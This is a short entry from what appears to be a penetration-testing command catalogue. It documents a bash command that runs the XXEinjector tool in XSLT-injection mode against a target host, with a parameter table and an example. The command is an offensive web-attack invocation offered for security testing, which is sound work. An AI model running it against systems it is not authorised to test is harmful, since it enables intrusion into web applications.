---
id: 7c8c7a16-3826-440b-94aa-f8bfe7b7ea1e
name: xxeinjector-test-xslt-injection
type: command
executor: bash
data: ruby XXEinjector.rb --host=$__HOST --file=/tmp/req.txt --xslt
output: null
created_at: '2023-04-06T03:56:43.973859+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
platforms:
  - Web
tags:
  - xxe
  - xslt
verified: true
validated: true
---

# xxeinjector-test-xslt-injection

## Command

```bash
ruby XXEinjector.rb --host=$__HOST --file=/tmp/req.txt --xslt
```

## Description

Tests for XSLT injection vulnerabilities that can lead to XXE-like behavior.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $__HOST | Target host | Yes |
| --file=/tmp/req.txt | Request file | Yes |
| --xslt | Enable XSLT test | Built-in |

## Examples

### Basic Usage

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
```

## Expected Output

Vulnerability confirmation if XSLT processed maliciously.

## Related

- [[procedures/Exploit-XXE-Vulnerability-Using-Multiple-Tools]]
- [[tools/XXEinjector]]
